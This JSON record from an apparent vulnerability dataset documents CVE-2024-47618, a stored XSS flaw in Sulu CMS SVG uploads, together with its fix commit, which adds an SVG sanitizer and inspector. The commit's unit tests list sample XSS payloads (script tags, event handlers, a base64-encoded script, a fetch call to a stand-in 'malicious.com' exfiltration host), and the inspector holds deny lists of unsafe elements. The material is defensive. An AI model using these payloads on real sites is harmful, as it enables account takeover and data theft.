{
  "cve_id": "CVE-2024-47618",
  "github_data": {
    "repository": "sulu/sulu",
    "fix_commit": "ca72f75eebe41ea7726624d8aea7da6c425f1eb9",
    "related_commits": [
      "ca72f75eebe41ea7726624d8aea7da6c425f1eb9"
    ],
    "patch_url": "https://github.com/sulu/sulu/commit/ca72f75eebe41ea7726624d8aea7da6c425f1eb9.patch",
    "fix_commit_details": {
      "sha": "ca72f75eebe41ea7726624d8aea7da6c425f1eb9",
      "commit_date": "2024-10-02T12:21:32Z",
      "author": {
        "login": "wachterjohannes",
        "type": "User",
        "stats": {
          "total_commits": 5877,
          "average_weekly_commits": 9.778702163061563,
          "total_additions": 0,
          "total_deletions": 0,
          "weeks_active": 313
        }
      },
      "commit_message": {
        "title": "Merge commit from fork",
        "length": 158,
        "has_description": true,
        "references_issue": true
      },
      "stats": {
        "total": 522,
        "additions": 522,
        "deletions": 0
      },
      "files": [
        {
          "filename": "composer.json",
          "status": "modified",
          "additions": 4,
          "deletions": 0,
          "patch": "@@ -84,6 +84,7 @@\n         \"symfony/finder\": \"^5.4 || ^6.0\",\n         \"symfony/form\": \"^5.4 || ^6.0\",\n         \"symfony/framework-bundle\": \"^5.4 || ^6.0\",\n+        \"symfony/html-sanitizer\": \"^5.4 || ^6.0\",\n         \"symfony/http-client\": \"^5.4 || ^6.0\",\n         \"symfony/http-foundation\": \"^5.4 || ^6.0\",\n         \"symfony/http-kernel\": \"^5.4 || ^6.0\",\n@@ -252,10 +253,13 @@\n         \"lint-rector\": [\n             \"Composer\\\\Config::disableProcessTimeout\",\n             \"@php bin/websiteconsole cache:warmup --env=dev\",\n+            \"@php bin/adminconsole cache:warmup --env=dev\",\n             \"@php vendor/bin/rector process --dry-run\"\n         ],\n         \"rector\": [\n             \"Composer\\\\Config::disableProcessTimeout\",\n+            \"@php bin/websiteconsole cache:warmup --env=dev\",\n+            \"@php bin/adminconsole cache:warmup --env=dev\",\n             \"@php vendor/bin/rector process\"\n         ],\n         \"lint-composer\": \"@composer validate --strict\","
        },
        {
          "filename": "src/Sulu/Bundle/MediaBundle/FileInspector/FileInspectorInterface.php",
          "status": "added",
          "additions": 24,
          "deletions": 0,
          "patch": "@@ -0,0 +1,24 @@\n+<?php\n+\n+/*\n+ * This file is part of Sulu.\n+ *\n+ * (c) Sulu GmbH\n+ *\n+ * This source file is subject to the MIT license that is bundled\n+ * with this source code in the file LICENSE.\n+ */\n+\n+namespace Sulu\\Bundle\\MediaBundle\\FileInspector;\n+\n+use Symfony\\Component\\HttpFoundation\\File\\UploadedFile;\n+\n+interface FileInspectorInterface\n+{\n+    public function supports(string $mimeType): bool;\n+\n+    /**\n+     * @throws UnsafeFileException\n+     */\n+    public function inspect(UploadedFile $file): UploadedFile;\n+}"
        },
        {
          "filename": "src/Sulu/Bundle/MediaBundle/FileInspector/SvgFileInspector.php",
          "status": "added",
          "additions": 100,
          "deletions": 0,
          "patch": "@@ -0,0 +1,100 @@\n+<?php\n+\n+declare(strict_types=1);\n+\n+/*\n+ * This file is part of Sulu.\n+ *\n+ * (c) Sulu GmbH\n+ *\n+ * This source file is subject to the MIT license that is bundled\n+ * with this source code in the file LICENSE.\n+ */\n+\n+namespace Sulu\\Bundle\\MediaBundle\\FileInspector;\n+\n+use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizerInterface;\n+use Symfony\\Component\\HttpFoundation\\File\\UploadedFile;\n+\n+/**\n+ * @final\n+ */\n+class SvgFileInspector implements FileInspectorInterface\n+{\n+    private const UNSAFE_ELEMENTS = ['script', 'iframe', 'foreignObject', 'use', 'image', 'animate'];\n+    private const UNSAFE_ATTRIBUTES = ['on', 'xlink:href', 'href'];\n+\n+    public function __construct(\n+        private HtmlSanitizerInterface $htmlSanitizer,\n+        private HtmlSanitizerInterface $htmlSanitizerSafe,\n+    ) {\n+    }\n+\n+    public function supports(string $mimeType): bool\n+    {\n+        return 'image/svg+xml' === $mimeType;\n+    }\n+\n+    public function inspect(UploadedFile $file): UploadedFile\n+    {\n+        $svg = $file->getContent();\n+\n+        if ($this->containsUnsafeContent($svg)) {\n+            throw new UnsafeFileException($file);\n+        }\n+\n+        $cleanedUpSvg = $this->htmlSanitizer->sanitize($svg);\n+        $safeSvg = $this->htmlSanitizerSafe->sanitize($svg);\n+\n+        if ($this->normalizeString($cleanedUpSvg) !== $this->normalizeString($safeSvg)) {\n+            throw new UnsafeFileException($file);\n+        }\n+\n+        return $file;\n+    }\n+\n+    private function containsUnsafeContent(string $svg): bool\n+    {\n+        \\libxml_use_internal_errors(true);\n+        $dom = new \\DOMDocument();\n+        $dom->loadXML($svg, \\LIBXML_NOENT | \\LIBXML_DTDLOAD);\n+        \\libxml_clear_errors();\n+\n+        foreach (self::UNSAFE_ELEMENTS as $element) {\n+            if ($dom->getElementsByTagName($element)->length > 0) {\n+                return true;\n+            }\n+        }\n+\n+        $xpath = new \\DOMXPath($dom);\n+        $xpath->registerNamespace('svg', 'http://www.w3.org/2000/svg');\n+        $xpath->registerNamespace('xlink', 'http://www.w3.org/1999/xlink');\n+\n+        foreach (self::UNSAFE_ATTRIBUTES as $attr) {\n+            $query = \"//*[starts-with(name(@*), '$attr') or @*[contains(., 'javascript:')]]\";\n+            $node = $xpath->query($query);\n+            if (false === $node || $node->length > 0) {\n+                return true;\n+            }\n+        }\n+\n+        // Check for event handlers\n+        $eventHandlerQuery = \"//*[@*[starts-with(name(), 'on')]]\";\n+        $node = $xpath->query($eventHandlerQuery);\n+        if (false === $node || $node->length > 0) {\n+            return true;\n+        }\n+\n+        // Check for data URIs\n+        if (\\str_contains($svg, 'data:')) {\n+            return true;\n+        }\n+\n+        return false;\n+    }\n+\n+    private function normalizeString(string $input): string\n+    {\n+        return \\strtolower((string) \\preg_replace('/\\s+/', '', $input));\n+    }\n+}"
        },
        {
          "filename": "src/Sulu/Bundle/MediaBundle/FileInspector/SvgSanitizerFactory.php",
          "status": "added",
          "additions": 64,
          "deletions": 0,
          "patch": "@@ -0,0 +1,64 @@\n+<?php\n+\n+declare(strict_types=1);\n+\n+/*\n+ * This file is part of Sulu.\n+ *\n+ * (c) Sulu GmbH\n+ *\n+ * This source file is subject to the MIT license that is bundled\n+ * with this source code in the file LICENSE.\n+ */\n+\n+namespace Sulu\\Bundle\\MediaBundle\\FileInspector;\n+\n+use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizer;\n+use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizerConfig;\n+use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizerInterface;\n+\n+/**\n+ * @internal\n+ */\n+final class SvgSanitizerFactory\n+{\n+    public function createSafe(): HtmlSanitizerInterface\n+    {\n+        $config = (new HtmlSanitizerConfig())\n+            ->allowElement('svg', ['width', 'height', 'viewBox'])\n+            ->allowElement('g', ['id'])\n+            ->allowElement('path', ['d', 'fill', 'stroke', 'stroke-width', 'class'])\n+            ->allowElement('circle', ['cx', 'cy', 'r', 'fill', 'stroke', 'stroke-width', 'class'])\n+            ->allowElement('rect', ['x', 'y', 'width', 'height', 'fill', 'stroke', 'stroke-width', 'class'])\n+            ->allowElement('line', ['x1', 'y1', 'x2', 'y2', 'stroke', 'stroke-width', 'class'])\n+            ->allowElement('polyline', ['points', 'fill', 'stroke', 'stroke-width', 'class'])\n+            ->allowElement('polygon', ['points', 'fill', 'stroke', 'stroke-width', 'class'])\n+            ->allowElement('text', ['x', 'y', 'font-family', 'font-size', 'fill', 'class'])\n+            ->allowElement('style')\n+            ->allowAttribute('class', '*')\n+            ->allowAttribute('style', '*');\n+\n+        return new HtmlSanitizer($config);\n+    }\n+\n+    public function create(): HtmlSanitizerInterface\n+    {\n+        $config = (new HtmlSanitizerConfig())\n+            ->allowElement('svg', ['width', 'height', 'viewBox'])\n+            ->allowElement('g', ['id'])\n+            ->allowElement('path', ['d', 'fill', 'stroke', 'stroke-width', 'class'])\n+            ->allowElement('circle', ['cx', 'cy', 'r', 'fill', 'stroke', 'stroke-width', 'class'])\n+            ->allowElement('rect', ['x', 'y', 'width', 'height', 'fill', 'stroke', 'stroke-width', 'class'])\n+            ->allowElement('line', ['x1', 'y1', 'x2', 'y2', 'stroke', 'stroke-width', 'class'])\n+            ->allowElement('polyline', ['points', 'fill', 'stroke', 'stroke-width', 'class'])\n+            ->allowElement('polygon', ['points', 'fill', 'stroke', 'stroke-width', 'class'])\n+            ->allowElement('text', ['x', 'y', 'font-family', 'font-size', 'fill', 'class'])\n+            ->allowElement('style')\n+            ->allowAttribute('class', '*')\n+            ->allowAttribute('style', '*')\n+            ->dropAttribute('xlink:href', '*')\n+            ->dropAttribute('href', '*');\n+\n+        return new HtmlSanitizer($config);\n+    }\n+}"
        },
        {
          "filename": "src/Sulu/Bundle/MediaBundle/FileInspector/UnsafeFileException.php",
          "status": "added",
          "additions": 31,
          "deletions": 0,
          "patch": "@@ -0,0 +1,31 @@\n+<?php\n+\n+/*\n+ * This file is part of Sulu.\n+ *\n+ * (c) Sulu GmbH\n+ *\n+ * This source file is subject to the MIT license that is bundled\n+ * with this source code in the file LICENSE.\n+ */\n+\n+namespace Sulu\\Bundle\\MediaBundle\\FileInspector;\n+\n+use Symfony\\Component\\HttpFoundation\\File\\UploadedFile;\n+\n+class UnsafeFileException extends \\Exception\n+{\n+    public function __construct(\n+        private UploadedFile $uploadedFile,\n+    ) {\n+        parent::__construct(\\sprintf(\n+            'The file \"%s\" is not safe.',\n+            $uploadedFile->getClientOriginalName(),\n+        ));\n+    }\n+\n+    public function getUploadedFile(): UploadedFile\n+    {\n+        return $this->uploadedFile;\n+    }\n+}"
        },
        {
          "filename": "src/Sulu/Bundle/MediaBundle/FileInspector/UploadFileSubscriber.php",
          "status": "added",
          "additions": 71,
          "deletions": 0,
          "patch": "@@ -0,0 +1,71 @@\n+<?php\n+\n+declare(strict_types=1);\n+\n+/*\n+ * This file is part of Sulu.\n+ *\n+ * (c) Sulu GmbH\n+ *\n+ * This source file is subject to the MIT license that is bundled\n+ * with this source code in the file LICENSE.\n+ */\n+\n+namespace Sulu\\Bundle\\MediaBundle\\FileInspector;\n+\n+use Symfony\\Component\\EventDispatcher\\EventSubscriberInterface;\n+use Symfony\\Component\\HttpFoundation\\File\\UploadedFile;\n+use Symfony\\Component\\HttpKernel\\Event\\RequestEvent;\n+use Symfony\\Component\\HttpKernel\\Exception\\BadRequestHttpException;\n+\n+/**\n+ * @internal\n+ */\n+final class UploadFileSubscriber implements EventSubscriberInterface\n+{\n+    /**\n+     * @return array<string, string>\n+     */\n+    public static function getSubscribedEvents(): array\n+    {\n+        return [\n+            'kernel.request' => 'onKernelRequest',\n+        ];\n+    }\n+\n+    /**\n+     * @var FileInspectorInterface[]\n+     */\n+    private array $fileInspectors;\n+\n+    /**\n+     * @param iterable<FileInspectorInterface> $fileInspectors\n+     */\n+    public function __construct(\n+        iterable $fileInspectors,\n+    ) {\n+        $this->fileInspectors = \\iterator_to_array($fileInspectors);\n+    }\n+\n+    public function onKernelRequest(RequestEvent $event): void\n+    {\n+        $request = $event->getRequest();\n+\n+        /**\n+         * @var string $key\n+         * @var UploadedFile $file\n+         */\n+        foreach ($request->files as $key => $file) {\n+            foreach ($this->fileInspectors as $fileInspector) {\n+                $mimeType = $file->getClientMimeType();\n+                if (null !== $mimeType && $fileInspector->supports($mimeType)) {\n+                    try {\n+                        $request->files->set($key, $fileInspector->inspect($file));\n+                    } catch (UnsafeFileException $exception) {\n+                        throw new BadRequestHttpException($exception->getMessage(), $exception);\n+                    }\n+                }\n+            }\n+        }\n+    }\n+}"
        },
        {
          "filename": "src/Sulu/Bundle/MediaBundle/Resources/config/services.xml",
          "status": "modified",
          "additions": 39,
          "deletions": 0,
          "patch": "@@ -509,5 +509,44 @@\n             <tag name=\"jms_serializer.event_subscriber\"/>\n             <tag name=\"sulu.context\" context=\"admin\"/>\n         </service>\n+\n+        <service\n+            id=\"sulu_media.file_inspector.sanitizer_factory\"\n+            class=\"Sulu\\Bundle\\MediaBundle\\FileInspector\\SvgSanitizerFactory\"\n+        />\n+\n+        <service\n+            id=\"sulu_media.file_inspector.html_sanitizer\"\n+            class=\"Symfony\\Component\\HtmlSanitizer\\HtmlSanitizerInterface\"\n+        >\n+            <factory service=\"sulu_media.file_inspector.sanitizer_factory\" method=\"create\"/>\n+        </service>\n+\n+        <service\n+            id=\"sulu_media.file_inspector.html_sanitizer_safe\"\n+            class=\"Symfony\\Component\\HtmlSanitizer\\HtmlSanitizerInterface\"\n+        >\n+            <factory service=\"sulu_media.file_inspector.sanitizer_factory\" method=\"createSafe\"/>\n+        </service>\n+\n+        <service\n+            id=\"sulu_media.file_inspector.svg_inspector\"\n+            class=\"Sulu\\Bundle\\MediaBundle\\FileInspector\\SvgFileInspector\"\n+        >\n+            <argument type=\"service\" id=\"sulu_media.file_inspector.html_sanitizer\"/>\n+            <argument type=\"service\" id=\"sulu_media.file_inspector.html_sanitizer_safe\"/>\n+\n+            <tag name=\"sulu_media.file_inspector\"/>\n+        </service>\n+        <service id=\"Sulu\\Bundle\\MediaBundle\\FileInspector\\SvgSafetyInspectorInterface\" alias=\"sulu_media.file_inspector.svg_inspector\"/>\n+\n+        <service\n+            id=\"sulu_media.file_inspector.subscriber\"\n+            class=\"Sulu\\Bundle\\MediaBundle\\FileInspector\\UploadFileSubscriber\"\n+        >\n+            <argument type=\"tagged\" tag=\"sulu_media.file_inspector\"/>\n+\n+            <tag name=\"kernel.event_subscriber\"/>\n+        </service>\n     </services>\n </container>"
        },
        {
          "filename": "src/Sulu/Bundle/MediaBundle/Tests/Unit/SvgInspector/SvgFileInspectorTest.php",
          "status": "added",
          "additions": 79,
          "deletions": 0,
          "patch": "@@ -0,0 +1,79 @@\n+<?php\n+\n+declare(strict_types=1);\n+\n+/*\n+ * This file is part of Sulu.\n+ *\n+ * (c) Sulu GmbH\n+ *\n+ * This source file is subject to the MIT license that is bundled\n+ * with this source code in the file LICENSE.\n+ */\n+\n+namespace Sulu\\Bundle\\MediaBundle\\Tests\\Unit\\SvgInspector;\n+\n+use PHPUnit\\Framework\\TestCase;\n+use Prophecy\\PhpUnit\\ProphecyTrait;\n+use Sulu\\Bundle\\MediaBundle\\FileInspector\\SvgFileInspector;\n+use Sulu\\Bundle\\MediaBundle\\FileInspector\\SvgSanitizerFactory;\n+use Sulu\\Bundle\\MediaBundle\\FileInspector\\UnsafeFileException;\n+use Symfony\\Component\\HttpFoundation\\File\\UploadedFile;\n+\n+class SvgFileInspectorTest extends TestCase\n+{\n+    use ProphecyTrait;\n+\n+    public static function provideSvgs(): \\Generator\n+    {\n+        // Safe SVGs\n+        yield 'simple svg' => ['<svg></svg>', true];\n+        yield 'simple svg with text' => ['<svg>text</svg>', true];\n+        yield 'svg with attributes' => ['<svg width=\"100\" height=\"100\" viewBox=\"0 0 100 100\"></svg>', true];\n+        yield 'svg with path' => ['<svg><path d=\"M10 10 H 90 V 90 H 10 L 10 10\"/></svg>', true];\n+        yield 'svg with style' => ['<svg><style>.cls-1{fill:none;}</style><circle class=\"cls-1\" cx=\"50\" cy=\"50\" r=\"40\"/></svg>', true];\n+\n+        // Potentially unsafe SVGs\n+        yield 'svg with script tag' => ['<svg><script>alert(\"XSS\")</script></svg>', false];\n+        yield 'svg with event handler' => ['<svg><circle cx=\"50\" cy=\"50\" r=\"40\" onclick=\"alert(\\'XSS\\')\"/></svg>', false];\n+        yield 'svg with iframe' => ['<svg><iframe src=\"http://example.com\"></iframe></svg>', false];\n+        yield 'svg with external reference' => ['<svg><use xlink:href=\"http://example.com/image.svg#fragment\"/></svg>', false];\n+        yield 'svg with data URI' => ['<svg><image href=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAACklEQVR4nGMAAQAABQABDQottAAAAABJRU5ErkJggg==\"/></svg>', false];\n+        yield 'svg with javascript in attribute' => ['<svg><a xlink:href=\"javascript:alert(\\'XSS\\')\">Click me</a></svg>', false];\n+\n+        // Additional potentially unsafe SVGs\n+        yield 'svg with onload event' => ['<svg width=\"100\" height=\"100\" onload=\"alert(\\'XSS\\')\"></svg>', false];\n+        yield 'svg with foreignObject' => ['<svg><foreignObject width=\"100%\" height=\"100%\"><body xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert(\"XSS\")</script></body></foreignObject></svg>', false];\n+        yield 'svg with base64 encoded script' => ['<svg><image href=\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoJ1hTUyB2aWEgYmFzZTY0IScpIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiPjwv c3ZnPg==\" /></svg>', false];\n+        yield 'svg with setTimeout' => ['<svg><script type=\"text/javascript\">setTimeout(function() { alert(\"XSS\"); }, 1000);</script></svg>', false];\n+        yield 'svg with external script' => ['<svg><script type=\"text/javascript\" xlink:href=\"http://malicious.com/xss.js\"></script></svg>', false];\n+        yield 'svg with animate element' => ['<svg><circle cx=\"50\" cy=\"50\" r=\"40\"><animate attributeName=\"r\" from=\"40\" to=\"20\" dur=\"1s\" begin=\"mouseover\" onend=\"alert(\\'XSS\\')\"/></circle></svg>', false];\n+        yield 'svg with onclick event in text' => ['<svg><text x=\"10\" y=\"50\" onclick=\"alert(\\'XSS\\')\">Click me!</text></svg>', false];\n+        yield 'svg with external fetch' => ['<svg><script>fetch(\"http://malicious.com/steal-data\").then(response => response.text()).then(data => console.log(data));</script></svg>', false];\n+        yield 'svg with conditional script' => ['<svg><script>if (confirm(\"Proceed?\")) { alert(\"XSS\"); }</script></svg>', false];\n+        yield 'svg with phishing link' => ['<svg><a href=\"http://phishing-site.com\" target=\"_blank\"><text x=\"10\" y=\"50\">Click here for a prize!</text></a></svg>', false];\n+    }\n+\n+    /**\n+     * @dataProvider provideSvgs\n+     */\n+    public function testIsSafe(string $svg, bool $expectedSafe): void\n+    {\n+        if (!$expectedSafe) {\n+            $this->expectException(UnsafeFileException::class);\n+        }\n+\n+        $factory = new SvgSanitizerFactory();\n+\n+        \\file_put_contents('test.svg', $svg);\n+        $uploadedFile = new UploadedFile('test.svg', 'test.svg', 'image/svg+xml');\n+\n+        $svgSafetyInspector = new SvgFileInspector($factory->create(), $factory->createSafe());\n+\n+        $result = $svgSafetyInspector->inspect($uploadedFile);\n+\n+        if ($expectedSafe) {\n+            $this->assertSame($uploadedFile, $result);\n+        }\n+    }\n+}"
        },
        {
          "filename": "src/Sulu/Bundle/MediaBundle/Tests/Unit/SvgInspector/UploadFileSubscriberTest.php",
          "status": "added",
          "additions": 110,
          "deletions": 0,
          "patch": "@@ -0,0 +1,110 @@\n+<?php\n+\n+declare(strict_types=1);\n+\n+/*\n+ * This file is part of Sulu.\n+ *\n+ * (c) Sulu GmbH\n+ *\n+ * This source file is subject to the MIT license that is bundled\n+ * with this source code in the file LICENSE.\n+ */\n+\n+namespace Sulu\\Bundle\\MediaBundle\\Tests\\Unit\\SvgInspector;\n+\n+use PHPUnit\\Framework\\TestCase;\n+use Prophecy\\PhpUnit\\ProphecyTrait;\n+use Prophecy\\Prophecy\\ObjectProphecy;\n+use Sulu\\Bundle\\MediaBundle\\FileInspector\\FileInspectorInterface;\n+use Sulu\\Bundle\\MediaBundle\\FileInspector\\UnsafeFileException;\n+use Sulu\\Bundle\\MediaBundle\\FileInspector\\UploadFileSubscriber;\n+use Symfony\\Component\\HttpFoundation\\File\\UploadedFile;\n+use Symfony\\Component\\HttpFoundation\\Request;\n+use Symfony\\Component\\HttpKernel\\Event\\RequestEvent;\n+use Symfony\\Component\\HttpKernel\\Exception\\BadRequestHttpException;\n+use Symfony\\Component\\HttpKernel\\HttpKernelInterface;\n+\n+class UploadFileSubscriberTest extends TestCase\n+{\n+    use ProphecyTrait;\n+\n+    /**\n+     * @var ObjectProphecy<FileInspectorInterface>\n+     */\n+    private ObjectProphecy $svgInspector;\n+\n+    private UploadFileSubscriber $subscriber;\n+\n+    protected function setUp(): void\n+    {\n+        $this->svgInspector = $this->prophesize(FileInspectorInterface::class);\n+        $this->subscriber = new UploadFileSubscriber(new \\ArrayObject([$this->svgInspector->reveal()]));\n+    }\n+\n+    public function testGetSubscribedEvents(): void\n+    {\n+        $this->assertSame(\n+            ['kernel.request' => 'onKernelRequest'],\n+            UploadFileSubscriber::getSubscribedEvents(),\n+        );\n+    }\n+\n+    public function testOnKernelRequestWithSafeSvg(): void\n+    {\n+        $mimeType = 'image/svg+xml';\n+        $uploadedFile = new UploadedFile('test.svg', 'test.svg', $mimeType, 0, true);\n+\n+        $request = new Request([], [], [], [], ['file' => $uploadedFile]);\n+        $event = $this->createRequestEvent($request);\n+\n+        $this->svgInspector->supports($mimeType)->willReturn(true);\n+        $this->svgInspector->inspect($uploadedFile)->willReturn($uploadedFile);\n+\n+        $this->subscriber->onKernelRequest($event);\n+\n+        // If we reach here without exception, the test passes\n+        $this->addToAssertionCount(1);\n+    }\n+\n+    public function testOnKernelRequestWithUnsafeSvg(): void\n+    {\n+        $this->expectException(BadRequestHttpException::class);\n+\n+        $mimeType = 'image/svg+xml';\n+        $uploadedFile = new UploadedFile('test.svg', 'test.svg', $mimeType, 0, true);\n+\n+        $request = new Request([], [], [], [], ['file' => $uploadedFile]);\n+        $event = $this->createRequestEvent($request);\n+\n+        $this->svgInspector->supports($mimeType)->willReturn(true);\n+        $this->svgInspector->inspect($uploadedFile)->willThrow(new UnsafeFileException($uploadedFile));\n+\n+\n+        $this->subscriber->onKernelRequest($event);\n+    }\n+\n+    public function testOnKernelRequestWithNonSvgFile(): void\n+    {\n+        $mimeType = 'image/jpeg';\n+        $uploadedFile = new UploadedFile('test.svg', 'test.svg', $mimeType, 0, true);\n+\n+        $request = new Request([], [], [], [], ['file' => $uploadedFile]);\n+        $event = $this->createRequestEvent($request);\n+\n+        $this->svgInspector->supports($mimeType)->willReturn(false);\n+        $this->svgInspector->inspect($uploadedFile)->shouldNotBeCalled();\n+\n+        $this->subscriber->onKernelRequest($event);\n+\n+        // If we reach here without exception, the test passes\n+        $this->addToAssertionCount(1);\n+    }\n+\n+    private function createRequestEvent(Request $request): RequestEvent\n+    {\n+        $kernel = $this->prophesize(HttpKernelInterface::class);\n+\n+        return new RequestEvent($kernel->reveal(), $request, HttpKernelInterface::MAIN_REQUEST);\n+    }\n+}"
        }
      ],
      "file_patterns": {
        "security_files": 0,
        "config_files": 2,
        "dependency_files": 0,
        "test_files": 2,
        "unique_directories": 4,
        "max_directory_depth": 7
      },
      "context": {
        "surrounding_commits": [
          {
            "sha": "eeb3cc463463fb110008352d9e0f550e355fdf36",
            "date": "2025-01-14T13:14:47Z",
            "author_login": "alexander-schranz"
          },
          {
            "sha": "6c9f9d63a3a2a0950ef0702dad33abab73d122c4",
            "date": "2025-01-14T13:14:32Z",
            "author_login": "Prokyonn"
          },
          {
            "sha": "8d5b3255a243b6b8a9cb8b3abb1f7f337a5ff18f",
            "date": "2025-01-09T14:15:55Z",
            "author_login": "mamazu"
          },
          {
            "sha": "04d33c30f978bec25dc380acb436ed0cef826e7b",
            "date": "2025-01-09T12:49:04Z",
            "author_login": "eekes"
          },
          {
            "sha": "e5cfa4d76104dabca227db25390b7b4aedd855e8",
            "date": "2025-01-08T11:08:58Z",
            "author_login": "alexander-schranz"
          }
        ]
      }
    }
  },
  "vulnerability_details": {
    "cvss_score": 5.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
    "cwe_id": "CWE-79",
    "description": "Sulu is a PHP content management system. Sulu is vulnerable against XSS whereas a low privileged user with access to the \u201cMedia\u201d section can upload an SVG file with a malicious payload. Once uploaded and accessed, the malicious javascript will be executed on the victims\u2019 (other users including admins) browsers. This issue is fixed in 2.6.5.",
    "attack_vector": "NETWORK",
    "attack_complexity": "LOW"
  },
  "temporal_data": {
    "published_date": "2024-10-03T15:15:15.147",
    "last_modified": "2024-10-08T14:31:08.180",
    "fix_date": "2024-10-02T12:21:32Z"
  },
  "references": [
    {
      "url": "https://github.com/sulu/sulu/commit/ca72f75eebe41ea7726624d8aea7da6c425f1eb9",
      "source": "security-advisories@github.com",
      "tags": [
        "Patch"
      ]
    },
    {
      "url": "https://github.com/sulu/sulu/security/advisories/GHSA-255w-87rh-rg44",
      "source": "security-advisories@github.com",
      "tags": [
        "Vendor Advisory"
      ]
    }
  ],
  "collection_metadata": {
    "collected_at": "2025-01-11T23:09:02.105918",
    "processing_status": "raw"
  },
  "repository_context": {
    "name": "sulu",
    "owner": "sulu",
    "created_at": "2013-10-18T12:57:02Z",
    "updated_at": "2025-01-14T13:14:57Z",
    "pushed_at": "2025-01-14T13:15:09Z",
    "size": 147491,
    "stars": 1189,
    "forks": 340,
    "open_issues": 545,
    "watchers": 1189,
    "has_security_policy": false,
    "default_branch": "2.6",
    "protected_branches": [
      "1.6",
      "2.5",
      "2.6",
      "3.0"
    ],
    "languages": {
      "PHP": 11214954,
      "JavaScript": 4770785,
      "SCSS": 163694,
      "Twig": 47211,
      "CSS": 9960,
      "VCL": 4428,
      "Shell": 158
    },
    "commit_activity": {
      "total_commits_last_year": 404,
      "avg_commits_per_week": 7.769230769230769,
      "days_active_last_year": 108
    },
    "security_features": {
      "has_security_policy": false,
      "has_protected_branches": true,
      "has_wiki": true,
      "has_issues": true,
      "allow_forking": true,
      "is_template": false,
      "license": "mit"
    },
    "collected_at": "2025-01-14T14:47:29.807566"
  }
}